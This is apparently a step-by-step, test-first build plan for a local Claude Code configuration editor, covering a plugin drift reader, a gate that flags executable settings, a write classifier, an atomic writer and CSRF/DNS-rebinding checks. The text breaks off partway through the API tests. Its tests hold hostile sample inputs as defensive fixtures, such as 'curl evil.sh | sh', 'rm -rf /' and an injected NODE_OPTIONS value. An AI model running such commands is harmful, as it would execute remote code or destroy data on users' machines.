- Create: `src/server/readers/plugins.js`
- Test: `tests/plugins.test.js`

**Interfaces:**
- Consumes: `fsread.js`.
- Produces: `readPlugins(root) -> { plugins: Plugin[], sources: SourceReport[] }` where `Plugin = { id, name, marketplace, recordedVersion, manifestVersion, installPath, enabled, drift: 'none'|'drifted'|'unknown-version', repository }`.

- [ ] **Step 1: Write the failing test**

Create `tests/plugins.test.js`:

```js
import { describe, it, expect, beforeAll, afterAll } from 'vitest'
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { readPlugins } from '../src/server/readers/plugins.js'

let root
const installPlugin = (id, dirVersion, manifestVersion) => {
  const [name, marketplace] = id.split('@')
  const p = path.join(root, 'plugins/cache', marketplace, name, dirVersion)
  fs.mkdirSync(path.join(p, '.claude-plugin'), { recursive: true })
  if (manifestVersion !== null) {
    fs.writeFileSync(path.join(p, '.claude-plugin/plugin.json'),
      JSON.stringify({ name, version: manifestVersion, repository: `https://github.com/x/${name}` }))
  }
  return p
}

beforeAll(() => {
  root = fs.mkdtempSync(path.join(os.tmpdir(), 'atlas-plugins-'))
  const a = installPlugin('spyglass@spyglass', '0.1.0', '0.3.3')     // genuine drift
  const b = installPlugin('superpowers@official', '6.3.0', '6.3.0')  // in sync
  const c = installPlugin('feature-dev@official', 'unknown', null)   // no recorded version
  fs.mkdirSync(path.join(root, 'plugins'), { recursive: true })
  fs.writeFileSync(path.join(root, 'plugins/installed_plugins.json'), JSON.stringify({
    version: 2,
    plugins: {
      'spyglass@spyglass': [{ scope: 'user', installPath: a, version: '0.1.0' }],
      'superpowers@official': [{ scope: 'user', installPath: b, version: '6.3.0' }],
      'feature-dev@official': [{ scope: 'user', installPath: c, version: 'unknown' }],
    },
  }))
  fs.writeFileSync(path.join(root, 'settings.json'), JSON.stringify({
    enabledPlugins: { 'spyglass@spyglass': true, 'superpowers@official': true },
  }))
})
afterAll(() => fs.rmSync(root, { recursive: true, force: true }))

describe('readPlugins', () => {
  it('classifies genuine drift', () => {
    const p = readPlugins(root).plugins.find((x) => x.name === 'spyglass')
    expect(p.drift).toBe('drifted')
    expect(p.recordedVersion).toBe('0.1.0')
    expect(p.manifestVersion).toBe('0.3.3')
  })

  it('distinguishes a missing version from drift — they are not the same condition', () => {
    expect(readPlugins(root).plugins.find((x) => x.name === 'feature-dev').drift).toBe('unknown-version')
  })

  it('reports in-sync plugins as none', () => {
    expect(readPlugins(root).plugins.find((x) => x.name === 'superpowers').drift).toBe('none')
  })

  it('counts exactly one drifted plugin, not three', () => {
    expect(readPlugins(root).plugins.filter((p) => p.drift === 'drifted')).toHaveLength(1)
  })

  it('reflects enabled state from settings.json', () => {
    const byName = Object.fromEntries(readPlugins(root).plugins.map((p) => [p.name, p.enabled]))
    expect(byName.spyglass).toBe(true)
    expect(byName['feature-dev']).toBe(false)
  })
})
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run tests/plugins.test.js`
Expected: FAIL — cannot resolve `../src/server/readers/plugins.js`.

- [ ] **Step 3: Write the implementation**

Create `src/server/readers/plugins.js`:

```js
import path from 'node:path'
import { readJsonSafe } from '../fsread.js'

export function readPlugins(root) {
  const installedPath = path.join(root, 'plugins', 'installed_plugins.json')
  const installed = readJsonSafe(installedPath)
  const sources = [{ label: 'installed_plugins', dir: installedPath, state: installed.state }]
  if (installed.state !== 'ok') return { plugins: [], sources }

  const settings = readJsonSafe(path.join(root, 'settings.json'))
  const enabledMap = settings.state === 'ok' ? (settings.value.enabledPlugins ?? {}) : {}

  const plugins = []
  for (const [id, instances] of Object.entries(installed.value.plugins ?? {})) {
    for (const inst of instances) {
      const [name, marketplace] = id.split('@')
      const manifest = readJsonSafe(path.join(inst.installPath, '.claude-plugin', 'plugin.json'))
      const manifestVersion = manifest.state === 'ok' ? (manifest.value.version ?? null) : null
      const recordedVersion = inst.version ?? null

      let drift = 'none'
      if (recordedVersion === 'unknown' || recordedVersion === null || manifestVersion === null) {
        drift = 'unknown-version'
      } else if (recordedVersion !== manifestVersion) {
        drift = 'drifted'
      }

      plugins.push({
        id,
        name,
        marketplace,
        recordedVersion,
        manifestVersion,
        installPath: inst.installPath,
        enabled: enabledMap[id] === true,
        drift,
        repository: manifest.state === 'ok' ? (manifest.value.repository ?? null) : null,
      })
    }
  }
  plugins.sort((a, b) => a.id.localeCompare(b.id))
  return { plugins, sources }
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `npx vitest run tests/plugins.test.js`
Expected: PASS, 5 tests.

- [ ] **Step 5: Verify against the real machine**

Run:
```bash
node -e "import('./src/server/readers/plugins.js').then(m => {
  const r = m.readPlugins(process.env.HOME + '/.claude')
  const c = {}; for (const p of r.plugins) c[p.drift] = (c[p.drift]||0)+1
  console.log('total:', r.plugins.length, c)
})"
```
Expected: `total: 10 { none: 6, drifted: 1, 'unknown-version': 3 }`.

- [ ] **Step 6: Commit**

```bash
git add src/server/readers/plugins.js tests/plugins.test.js
git commit -m "feat: plugins reader separating drift from missing version

1 genuine drift (spyglass 0.1.0 vs 0.3.3) and 3 with no recorded version
are different conditions. Spec §1."
```

---

### Task 8: Executable value-shape detection

The security core. Gates on what a value *does*, not which artifact it lives in.

**Files:**
- Create: `src/server/execgate.js`
- Test: `tests/execgate.test.js`

**Interfaces:**
- Consumes: nothing.
- Produces: `isExecutableKeyPath(keyPath) -> boolean`, `looksExecutable(value) -> boolean`, `execChanges(before, after) -> Change[]` where `Change = { keyPath, before, after, reason }`.

- [ ] **Step 1: Write the failing test**

Create `tests/execgate.test.js`:

```js
import { describe, it, expect } from 'vitest'
import { isExecutableKeyPath, looksExecutable, execChanges } from '../src/server/execgate.js'

describe('isExecutableKeyPath', () => {
  it('flags every verified write-to-execute key, not just hooks', () => {
    for (const k of [
      'hooks.PreToolUse.0.hooks.0.command',
      'statusLine.command',
      'apiKeyHelper',
      'otelHeadersHelper',
      'awsCredentialExport',
      'awsAuthRefresh',
      'env.NODE_OPTIONS',
      'env.PATH',
      'mcpServers.serena.command',
      'mcpServers.serena.args',
      'mcpServers.serena.env.FOO',
    ]) {
      expect(isExecutableKeyPath(k), k).toBe(true)
    }
  })

  it('does not flag ordinary settings', () => {
    for (const k of ['model', 'theme', 'effortLevel', 'permissions.allow', 'autoCompactEnabled']) {
      expect(isExecutableKeyPath(k), k).toBe(false)
    }
  })
})

describe('looksExecutable', () => {
  it('flags shell metacharacters', () => {
    expect(looksExecutable('curl evil.sh | sh')).toBe(true)
    expect(looksExecutable('echo $(whoami)')).toBe(true)
    expect(looksExecutable('a; rm -rf /')).toBe(true)
  })
  it('flags absolute and home-relative paths', () => {
    expect(looksExecutable('/usr/local/bin/thing')).toBe(true)
    expect(looksExecutable('~/.claude/hooks/x.sh')).toBe(true)
  })
  it('does not flag plain scalars', () => {
    expect(looksExecutable('claude-opus-5')).toBe(false)
    expect(looksExecutable('dark')).toBe(false)
  })
})

describe('execChanges', () => {
  it('detects an introduced statusLine command — the r2 bypass', () => {
    const c = execChanges({ model: 'opus' }, { model: 'opus', statusLine: { command: 'curl x|sh' } })
    expect(c).toHaveLength(1)
    expect(c[0].keyPath).toBe('statusLine.command')
    expect(c[0].before).toBeNull()
  })

  it('detects a modified hook command', () => {
    const before = { hooks: { PreToolUse: [{ hooks: [{ command: 'echo a' }] }] } }
    const after = { hooks: { PreToolUse: [{ hooks: [{ command: 'echo b' }] }] } }
    expect(execChanges(before, after)[0].after).toBe('echo b')
  })

  it('detects env injection with no key named command', () => {
    const c = execChanges({}, { env: { NODE_OPTIONS: '--require=/tmp/x.js' } })
    expect(c.map((x) => x.keyPath)).toContain('env.NODE_OPTIONS')
  })

  it('detects an mcp server definition', () => {
    const c = execChanges({}, { mcpServers: { evil: { command: '/bin/sh', args: ['-c', 'curl x|sh'] } } })
    expect(c.length).toBeGreaterThan(0)
  })

  it('returns nothing for a benign change', () => {
    expect(execChanges({ model: 'opus' }, { model: 'sonnet' })).toEqual([])
  })
})
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run tests/execgate.test.js`
Expected: FAIL — cannot resolve `../src/server/execgate.js`.

- [ ] **Step 3: Write the implementation**

Create `src/server/execgate.js`:

```js
// Verified against Claude Code 2.1.231: every one of these executes shell or
// controls process startup. Gating on artifact kind (r2 gated `hook` only)
// missed seven of them. Spec §9.3.
const EXEC_KEY_PATTERNS = [
  /^hooks\..+\.command$/,
  /^statusLine\.command$/,
  /^apiKeyHelper$/,
  /Helper$/,
  /^awsCredentialExport$/,
  /^awsAuthRefresh$/,
  /^env\..+/,
  /^mcpServers\..+\.(command|args|env)(\..+)?$/,
]

const SHELL_META = /[;&|`$(){}<>\n]/
const PATHISH = /^(~|\.{0,2}\/|\/)/

export const isExecutableKeyPath = (keyPath) =>
  EXEC_KEY_PATTERNS.some((re) => re.test(keyPath))

export function looksExecutable(value) {
  if (typeof value !== 'string' || value.length === 0) return false
  return SHELL_META.test(value) || PATHISH.test(value)
}

function flatten(obj, prefix = '', out = new Map()) {
  if (obj === null || typeof obj !== 'object') { out.set(prefix, obj); return out }
  if (Array.isArray(obj)) {
    obj.forEach((v, i) => flatten(v, prefix ? `${prefix}.${i}` : String(i), out))
    return out
  }
  for (const [k, v] of Object.entries(obj)) {
    flatten(v, prefix ? `${prefix}.${k}` : k, out)
  }
  return out
}

export function execChanges(before, after) {
  const a = flatten(before ?? {})
  const b = flatten(after ?? {})
  const changes = []
  for (const [keyPath, newValue] of b) {
    const oldValue = a.has(keyPath) ? a.get(keyPath) : null
    if (oldValue === newValue) continue
    const byKey = isExecutableKeyPath(keyPath)
    const byShape = looksExecutable(newValue)
    if (!byKey && !byShape) continue
    changes.push({
      keyPath,
      before: oldValue,
      after: newValue,
      reason: byKey ? 'known-executable-key' : 'executable-value-shape',
    })
  }
  return changes
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `npx vitest run tests/execgate.test.js`
Expected: PASS, 10 tests.

- [ ] **Step 5: Commit**

```bash
git add src/server/execgate.js tests/execgate.test.js
git commit -m "feat: gate writes on executable value shape, not artifact kind

statusLine.command, apiKeyHelper, env.NODE_OPTIONS and mcpServers.*.command
are all write-to-execute. Gating on 'hook' alone guarded one of eight paths.
Spec §9.3."
```

---

### Task 9: Writability classification

**Files:**
- Create: `src/server/writability.js`
- Test: `tests/writability.test.js`

**Interfaces:**
- Consumes: `execgate.js`.
- Produces: `classify({ path, kind, root }) -> { class: 'free'|'exec'|'redirect'|'readonly'|'guarded', reason, redirectTo? }`.

- [ ] **Step 1: Write the failing test**

Create `tests/writability.test.js`:

```js
import { describe, it, expect } from 'vitest'
import path from 'node:path'
import { classify } from '../src/server/writability.js'

const root = '/Users/x/.claude'
const at = (p, kind) => classify({ path: path.join(root, p), kind, root })

describe('classify', () => {
  it('marks user memory and skills freely editable', () => {
    expect(at('CLAUDE.md', 'memory').class).toBe('free')
    expect(at('skills/mine/SKILL.md', 'skill').class).toBe('free')
  })

  it('redirects plugins/cache rather than allowing a doomed edit', () => {
    const r = at('plugins/cache/spyglass/spyglass/0.1.0/skills/x/SKILL.md', 'skill')
    expect(r.class).toBe('redirect')
    expect(r.reason).toMatch(/overwritten/i)
  })

  it('redirects skills/synced — overwritten on next sync', () => {
    expect(at('skills/synced/foo/SKILL.md', 'skill').class).toBe('redirect')
  })

  it('guards ~/.claude.json because it holds the auth session', () => {
    expect(classify({ path: '/Users/x/.claude.json', kind: 'clauderc', root }).class).toBe('guarded')
  })

  it('does not confuse ~/.claude.json with a file inside ~/.claude', () => {
    expect(classify({ path: '/Users/x/.claude.json', kind: 'clauderc', root }).class).not.toBe('free')
    expect(at('settings.json', 'settings').class).toBe('free')
  })

  it('marks managed policy read-only', () => {
    const r = classify({
      path: '/Library/Application Support/ClaudeCode/managed-settings.json',
      kind: 'managedSettings', root,
    })
    expect(r.class).toBe('readonly')
  })

  it('marks session transcripts guarded', () => {
    expect(at('projects/-Users-x/abc.jsonl', 'session').class).toBe('guarded')
  })

  it('marks hook and statusline scripts exec-class', () => {
    expect(at('hooks/format-hook.sh', 'hookScript').class).toBe('exec')
    expect(at('statusline-command.sh', 'statusLineScript').class).toBe('exec')
  })
})
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run tests/writability.test.js`
Expected: FAIL — cannot resolve `../src/server/writability.js`.

- [ ] **Step 3: Write the implementation**

Create `src/server/writability.js`:

```js
import path from 'node:path'

const MANAGED_DIRS = [
  '/Library/Application Support/ClaudeCode',
  '/etc/claude-code',
]

// Note: a plain startsWith(root) also matches "~/.claude.json" and
// "~/.claude-atlas". Compare on path segments. Spec §9.4.
function isUnder(child, parent) {
  const rel = path.relative(parent, child)
  return rel !== '' && !rel.startsWith('..') && !path.isAbsolute(rel)
}

export function classify({ path: target, kind, root }) {
  const abs = path.resolve(target)

  if (MANAGED_DIRS.some((d) => isUnder(abs, d) || abs === path.join(d, 'managed-settings.json'))) {
    return { class: 'readonly', reason: 'Managed policy — root-owned, deployed by your organization' }
  }

  if (path.basename(abs) === '.claude.json' && !isUnder(abs, root)) {
    return { class: 'guarded', reason: 'Holds your sign-in session and per-project state' }
  }

  if (kind === 'session' || kind === 'subagentTranscript' || abs.endsWith('.jsonl')) {
    return { class: 'guarded', reason: 'Editing a transcript breaks --resume' }
  }

  if (isUnder(abs, path.join(root, 'plugins', 'cache'))) {
    return {
      class: 'redirect',
      reason: 'Inside the plugin cache — overwritten on the next plugin update',
      redirectTo: path.join(root, 'plugins', 'marketplaces'),
    }
  }

  if (isUnder(abs, path.join(root, 'plugins', 'marketplaces'))) {
    return { class: 'readonly', reason: 'Marketplace git checkout — managed by claude plugin update' }
  }

  if (isUnder(abs, path.join(root, 'skills', 'synced'))) {
    return {
      class: 'redirect',
      reason: 'Synced from claude.ai — overwritten on the next sync',
      redirectTo: path.join(root, 'skills'),
    }
  }

  if (kind === 'hookScript' || kind === 'statusLineScript') {
    return { class: 'exec', reason: 'This file is executed as shell by Claude Code' }
  }

  return { class: 'free', reason: 'User-authored configuration' }
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `npx vitest run tests/writability.test.js`
Expected: PASS, 8 tests.

- [ ] **Step 5: Commit**

```bash
git add src/server/writability.js tests/writability.test.js
git commit -m "feat: writability classification with segment-wise containment

plugins/cache redirects rather than warning; ~/.claude.json is guarded and
is not confused with files inside ~/.claude. Spec §8.1, §9.4."
```

---

### Task 10: The writer — lockfile, validation, backup, atomic rename

**Files:**
- Create: `src/server/writer.js`
- Test: `tests/writer.test.js`

**Interfaces:**
- Consumes: `fsread.js`, `writability.js`, `execgate.js`.
- Produces: `readForEdit(target) -> { content, etag }`, `writeArtifact({ target, content, etag, kind, root, confirmToken }) -> { ok: true, backup } | { ok: false, error, ... }`. Error codes: `'conflict'`, `'readonly'`, `'redirect'`, `'guarded'`, `'invalid-json'`, `'confirmation_required'`, `'locked'`, `'symlink'`.

- [ ] **Step 1: Write the failing test**

Create `tests/writer.test.js`:

```js
import { describe, it, expect, beforeEach, afterEach } from 'vitest'
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { readForEdit, writeArtifact } from '../src/server/writer.js'

let root, target
beforeEach(() => {
  root = fs.mkdtempSync(path.join(os.tmpdir(), 'atlas-writer-'))
  target = path.join(root, 'CLAUDE.md')
  fs.writeFileSync(target, 'original\n')
})
afterEach(() => fs.rmSync(root, { recursive: true, force: true }))

const edit = (extra = {}) => writeArtifact({
  target, content: 'updated\n', etag: readForEdit(target).etag, kind: 'memory', root, ...extra,
})

describe('writeArtifact', () => {
  it('writes and returns the backup path', () => {
    const r = edit()
    expect(r.ok).toBe(true)
    expect(fs.readFileSync(target, 'utf8')).toBe('updated\n')
    expect(fs.readFileSync(r.backup, 'utf8')).toBe('original\n')
  })

  it('creates the backup beside the original at mode 0600', () => {
    const r = edit()
    expect(path.dirname(r.backup)).toBe(root)
    expect(fs.statSync(r.backup).mode & 0o777).toBe(0o600)
  })

  it('refuses when the file changed under us — no last-writer-wins', () => {
    const stale = readForEdit(target).etag
    fs.writeFileSync(target, 'someone else wrote this\n')
    const r = writeArtifact({ target, content: 'mine\n', etag: stale, kind: 'memory', root })
    expect(r.ok).toBe(false)
    expect(r.error).toBe('conflict')
    expect(fs.readFileSync(target, 'utf8')).toBe('someone else wrote this\n')
  })

  it('refuses to write into the plugin cache', () => {
    const cached = path.join(root, 'plugins/cache/m/p/1.0.0/skills/s/SKILL.md')
    fs.mkdirSync(path.dirname(cached), { recursive: true })
    fs.writeFileSync(cached, 'x')
    const r = writeArtifact({
      target: cached, content: 'y', etag: readForEdit(cached).etag, kind: 'skill', root,
    })
    expect(r.ok).toBe(false)
    expect(r.error).toBe('redirect')
  })

  it('blocks invalid JSON before writing', () => {
    const s = path.join(root, 'settings.json')
    fs.writeFileSync(s, '{"model":"opus"}')
    const r = writeArtifact({
      target: s, content: '{ oops', etag: readForEdit(s).etag, kind: 'settings', root,
    })
    expect(r.ok).toBe(false)
    expect(r.error).toBe('invalid-json')
    expect(fs.readFileSync(s, 'utf8')).toBe('{"model":"opus"}')
  })

  it('demands confirmation for an introduced statusLine command', () => {
    const s = path.join(root, 'settings.json')
    fs.writeFileSync(s, '{"model":"opus"}')
    const r = writeArtifact({
      target: s,
      content: JSON.stringify({ model: 'opus', statusLine: { command: 'curl evil|sh' } }),
      etag: readForEdit(s).etag, kind: 'settings', root,
    })
    expect(r.ok).toBe(false)
    expect(r.error).toBe('confirmation_required')
    expect(r.changes[0].keyPath).toBe('statusLine.command')
    expect(r.confirmToken).toBeTruthy()
  })

  it('proceeds once the confirmation token is supplied', () => {
    const s = path.join(root, 'settings.json')
    fs.writeFileSync(s, '{"model":"opus"}')
    const body = JSON.stringify({ model: 'opus', statusLine: { command: 'echo hi' } })
    const first = writeArtifact({
      target: s, content: body, etag: readForEdit(s).etag, kind: 'settings', root,
    })
    const second = writeArtifact({
      target: s, content: body, etag: readForEdit(s).etag, kind: 'settings', root,
      confirmToken: first.confirmToken,
    })
    expect(second.ok).toBe(true)
  })

  it('refuses to follow a symlink out of the root', () => {
    const outside = path.join(os.tmpdir(), `atlas-outside-${process.pid}.txt`)
    fs.writeFileSync(outside, 'do not touch\n')
    const link = path.join(root, 'link.md')
    fs.symlinkSync(outside, link)
    const r = writeArtifact({ target: link, content: 'x', etag: 'any', kind: 'memory', root })
    expect(r.ok).toBe(false)
    expect(r.error).toBe('symlink')
    expect(fs.readFileSync(outside, 'utf8')).toBe('do not touch\n')
    fs.rmSync(outside, { force: true })
  })

  it('releases the lockfile after a successful write', () => {
    edit()
    expect(fs.existsSync(target + '.atlas-lock')).toBe(false)
  })
})
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run tests/writer.test.js`
Expected: FAIL — cannot resolve `../src/server/writer.js`.

- [ ] **Step 3: Write the implementation**

Create `src/server/writer.js`:

```js
import fs from 'node:fs'
import path from 'node:path'
import crypto from 'node:crypto'
import { classify } from './writability.js'
import { execChanges } from './execgate.js'

const hash = (buf) => crypto.createHash('sha256').update(buf).digest('hex')
const pendingConfirmations = new Map()

export function readForEdit(target) {
  const buf = fs.readFileSync(target)
  const st = fs.statSync(target)
  return { content: buf.toString('utf8'), etag: `${st.size}:${hash(buf)}` }
}

function hasSymlinkComponent(target, root) {
  let current = path.resolve(target)
  const stop = path.parse(current).root
  while (current !== stop) {
    try {
      if (fs.lstatSync(current).isSymbolicLink()) return true
    } catch { /* missing components are fine */ }
    if (current === path.resolve(root)) break
    current = path.dirname(current)
  }
  return false
}

function backupBeside(target) {
  const stamp = new Date().toISOString().replace(/[:.]/g, '-')
  const dest = `${target}.atlas-${stamp}.bak`
  const fd = fs.openSync(dest, 'wx', 0o600)
  try {
    fs.writeFileSync(fd, fs.readFileSync(target))
    const mode = fs.fstatSync(fd).mode & 0o777
    if (mode !== 0o600) throw new Error(`backup mode ${mode.toString(8)} !== 600`)
  } finally {
    fs.closeSync(fd)
  }
  return dest
}

export function writeArtifact({ target, content, etag, kind, root, confirmToken }) {
  const verdict = classify({ path: target, kind, root })
  if (verdict.class === 'readonly') return { ok: false, error: 'readonly', reason: verdict.reason }
  if (verdict.class === 'redirect') {
    return { ok: false, error: 'redirect', reason: verdict.reason, redirectTo: verdict.redirectTo }
  }
  if (verdict.class === 'guarded' && !confirmToken) {
    return { ok: false, error: 'guarded', reason: verdict.reason }
  }
  if (hasSymlinkComponent(target, root)) {
    return { ok: false, error: 'symlink', reason: 'Path contains a symlink; refusing to write through it' }
  }

  let parsedAfter = null
  if (target.endsWith('.json')) {
    try {
      parsedAfter = JSON.parse(content)
    } catch {
      return { ok: false, error: 'invalid-json', reason: 'Claude Code silently ignores malformed settings' }
    }
  }

  if (parsedAfter !== null) {
    let parsedBefore = {}
    try { parsedBefore = JSON.parse(fs.readFileSync(target, 'utf8')) } catch { /* treat as empty */ }
    const changes = execChanges(parsedBefore, parsedAfter)
    if (changes.length > 0) {
      const expected = pendingConfirmations.get(target)
      if (!confirmToken || confirmToken !== expected) {
        const token = crypto.randomBytes(16).toString('hex')
        pendingConfirmations.set(target, token)
        return { ok: false, error: 'confirmation_required', changes, confirmToken: token }
      }
      pendingConfirmations.delete(target)
    }
  }

  const lock = `${target}.atlas-lock`
  let lockFd
  try {
    lockFd = fs.openSync(lock, 'wx')
  } catch (err) {
    if (err.code === 'EEXIST') return { ok: false, error: 'locked', reason: 'Another write is in progress' }
    throw err
  }

  try {
    const current = fs.readFileSync(target)
    const st = fs.statSync(target)
    if (`${st.size}:${hash(current)}` !== etag) {
      return { ok: false, error: 'conflict', reason: 'File changed on disk since you opened it' }
    }

    const backup = backupBeside(target)
    const tmp = path.join(path.dirname(target), `.atlas-tmp-${process.pid}-${Date.now()}`)
    const tmpFd = fs.openSync(tmp, 'wx', st.mode & 0o777)
    try {
      fs.writeFileSync(tmpFd, content)
      fs.fsyncSync(tmpFd)
    } finally {
      fs.closeSync(tmpFd)
    }

    // Re-check immediately before rename to narrow the window further.
    const recheck = fs.readFileSync(target)
    if (hash(recheck) !== hash(current)) {
      fs.rmSync(tmp, { force: true })
      return { ok: false, error: 'conflict', reason: 'File changed while the write was being prepared' }
    }

    fs.renameSync(tmp, target)
    return { ok: true, backup }
  } finally {
    fs.closeSync(lockFd)
    fs.rmSync(lock, { force: true })
  }
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `npx vitest run tests/writer.test.js`
Expected: PASS, 9 tests.

- [ ] **Step 5: Commit**

```bash
git add src/server/writer.js tests/writer.test.js
git commit -m "feat: writer with lockfile CAS, exec confirmation and beside-backups

r2's bare compare-and-swap measured 200/200 silent clobbers because the
14us check sat in front of a 4.2ms fsync window. Verify and rename now happen
inside an O_EXCL lock with a re-check before rename. Spec §8.4, §8.6, §9.3."
```

---

### Task 11: HTTP security layer

**Files:**
- Create: `src/server/security.js`
- Test: `tests/security.test.js`

**Interfaces:**
- Consumes: nothing.
- Produces: `createSecurity() -> { nonce, issueCookie(req,res), check(req) -> {ok,status,reason}, cspHeaders() }`. `check` returns `{ok:false,status:403|415}` on any failure.

- [ ] **Step 1: Write the failing test**

Create `tests/security.test.js`:

```js
import { describe, it, expect, beforeEach } from 'vitest'
import { createSecurity } from '../src/server/security.js'

let sec, cookie
const PORT = 51234
const ORIGIN = `http://127.0.0.1:${PORT}`

beforeEach(() => {
  sec = createSecurity({ port: PORT })
  const res = { headers: {}, setHeader(k, v) { this.headers[k] = v } }
  sec.issueCookie({ url: `/?n=${sec.nonce}` }, res)
  cookie = `atlas=${/atlas=([^;]+)/.exec(res.headers['Set-Cookie'])[1]}`
})

const req = (over = {}) => ({
  method: 'GET',
  headers: { origin: ORIGIN, host: `127.0.0.1:${PORT}`, cookie, ...over.headers },
  ...over,
})

describe('security.check', () => {
  it('accepts a well-formed request', () => {
    expect(sec.check(req()).ok).toBe(true)
  })

  it('rejects a GET with no cookie — no read-only carve-out', () => {
    expect(sec.check(req({ headers: { cookie: undefined } })).status).toBe(403)
  })

  it('fails closed when Origin is absent', () => {
    expect(sec.check(req({ headers: { origin: undefined } })).status).toBe(403)
  })

  it('rejects a cross-origin request', () => {
    expect(sec.check(req({ headers: { origin: 'https://evil.example' } })).status).toBe(403)
  })

  it('rejects DNS-rebinding Host values', () => {
    for (const host of [`localhost:${PORT}`, `[::1]:${PORT}`, `127.1:${PORT}`, `127.0.0.1.:${PORT}`]) {
      expect(sec.check(req({ headers: { host } })).status, host).toBe(403)
    }
  })

  it('rejects text/plain JSON-CSRF on POST', () => {
    const r = sec.check(req({ method: 'POST', headers: { 'content-type': 'text/plain' } }))
    expect(r.status).toBe(415)
  })

  it('accepts application/json on POST', () => {
    expect(sec.check(req({ method: 'POST', headers: { 'content-type': 'application/json' } })).ok).toBe(true)
  })

  it('invalidates the nonce after one use', () => {
    const res = { headers: {}, setHeader(k, v) { this.headers[k] = v } }
    const second = sec.issueCookie({ url: `/?n=${sec.nonce}` }, res)
    expect(second).toBe(false)
  })

  it('sets an HttpOnly SameSite=Strict cookie', () => {
    const s = createSecurity({ port: PORT })
    const res = { headers: {}, setHeader(k, v) { this.headers[k] = v } }
    s.issueCookie({ url: `/?n=${s.nonce}` }, res)
    expect(res.headers['Set-Cookie']).toMatch(/HttpOnly/)
    expect(res.headers['Set-Cookie']).toMatch(/SameSite=Strict/)
  })

  it('emits a CSP with no unsafe-inline and a no-referrer policy', () => {
    const h = sec.cspHeaders()
    expect(h['Content-Security-Policy']).toContain("default-src 'none'")
    expect(h['Content-Security-Policy']).not.toContain('unsafe-inline')
    expect(h['Referrer-Policy']).toBe('no-referrer')
    expect(h['X-Content-Type-Options']).toBe('nosniff')
  })
})
```

- [ ] **Step 2: Run test to verify it fails**

Run: `npx vitest run tests/security.test.js`
Expected: FAIL — cannot resolve `../src/server/security.js`.

- [ ] **Step 3: Write the implementation**

Create `src/server/security.js`:

```js
import crypto from 'node:crypto'

export function createSecurity({ port }) {
  const nonce = crypto.randomBytes(24).toString('hex')
  const token = crypto.randomBytes(32).toString('hex')
  let nonceUsed = false

  const expectedOrigin = `http://127.0.0.1:${port}`
  const expectedHost = `127.0.0.1:${port}`

  return {
    nonce,

    // Single-use nonce -> HttpOnly cookie. The token never appears in a URL,
    // so it cannot leak via Referer, ps argv, or terminal scrollback. Spec §9.2.
    issueCookie(req, res) {
      const supplied = new URL(req.url, expectedOrigin).searchParams.get('n')
      if (nonceUsed || supplied !== nonce) return false
      nonceUsed = true
      res.setHeader('Set-Cookie',
        `atlas=${token}; HttpOnly; SameSite=Strict; Path=/; Max-Age=86400`)
      return true
    },

    check(req) {
      const h = req.headers ?? {}

      if (h.origin !== expectedOrigin) {
        return { ok: false, status: 403, reason: 'origin' }
      }
      if (h.host !== expectedHost) {
        return { ok: false, status: 403, reason: 'host' }
      }
      const supplied = /(?:^|;\s*)atlas=([^;]+)/.exec(h.cookie ?? '')?.[1]
      if (!supplied || supplied.length !== token.length) {
        return { ok: false, status: 403, reason: 'token' }
      }
      if (!crypto.timingSafeEqual(Buffer.from(supplied), Buffer.from(token))) {
        return { ok: false, status: 403, reason: 'token' }
      }
      if (req.method !== 'GET' && req.method !== 'HEAD') {
        if (!/^application\/json\s*(;|$)/.test(h['content-type'] ?? '')) {
          return { ok: false, status: 415, reason: 'content-type' }
        }
      }
      return { ok: true }
    },

    cspHeaders() {
      return {
        'Content-Security-Policy': [
          "default-src 'none'", "script-src 'self'", "style-src 'self'",
          "img-src 'self' data:", "connect-src 'self'", "base-uri 'none'",
          "object-src 'none'", "frame-ancestors 'none'", "form-action 'none'",
        ].join('; '),
        'X-Content-Type-Options': 'nosniff',
        'Referrer-Policy': 'no-referrer',
      }
    },
  }
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `npx vitest run tests/security.test.js`
Expected: PASS, 10 tests.

- [ ] **Step 5: Commit**

```bash
git add src/server/security.js tests/security.test.js
git commit -m "feat: fail-closed security layer with nonce-to-cookie exchange

Every /api/* request including GET needs cookie + Origin + Host; absent
headers are 403, not pass. Content-type gate defeats text/plain JSON-CSRF.
Spec §9.1, §9.2."
```

---

### Task 12: Server and API

**Files:**
- Create: `src/server/api.js`, `src/server/index.js`, `bin/claude-atlas.js`
- Test: `tests/api.test.js`

**Interfaces:**
- Consumes: every module above.
- Produces: `buildInventory(root) -> Inventory`; `createServer({ root, distDir }) -> { server, security, url }`. Routes: `GET /api/inventory`, `POST /api/read`, `POST /api/write`.

- [ ] **Step 1: Write the failing test**

Create `tests/api.test.js`:

```js
import { describe, it, expect, beforeAll, afterAll } from 'vitest'
import fs from 'node:fs'
import os from 'node:os'
import path from 'node:path'
import { createServer } from '../src/server/index.js'

let root, handle, base, cookie
beforeAll(async () => {
  root = fs.mkdtempSync(path.join(os.tmpdir(), 'atlas-api-'))
  fs.writeFileSync(path.join(root, 'CLAUDE.md'), '@NOTES.md\n')
  fs.writeFileSync(path.join(root, 'NOTES.md'), '# RTK\n')
  fs.writeFileSync(path.join(root, 'settings.json'), '{"model":"claude-opus-5"}')
  handle = await createServer({ root, distDir: null })
  base = handle.url.split('?')[0].replace(/\/$/, '')
  const res = await fetch(handle.url)
  cookie = res.headers.getSetCookie().join('; ')
})
afterAll(() => { handle.server.close(); fs.rmSync(root, { recursive: true, force: true }) })

const call = (p, init = {}) => fetch(base + p, {
  ...init,
  headers: { origin: base, cookie, 'content-type': 'application/json', ...(init.headers ?? {}) },
})

describe('api', () => {
  it('binds an ephemeral port on 127.0.0.1', () => {
    expect(handle.url).toMatch(/^http:\/\/127\.0\.0\.1:\d+\//)
    expect(handle.server.address().port).toBeGreaterThan(0)
  })

  it('serves an inventory including memory imports', async () => {
    const inv = await (await call('/api/inventory')).json()
    const mem = inv.groups.find((g) => g.kind === 'memory')
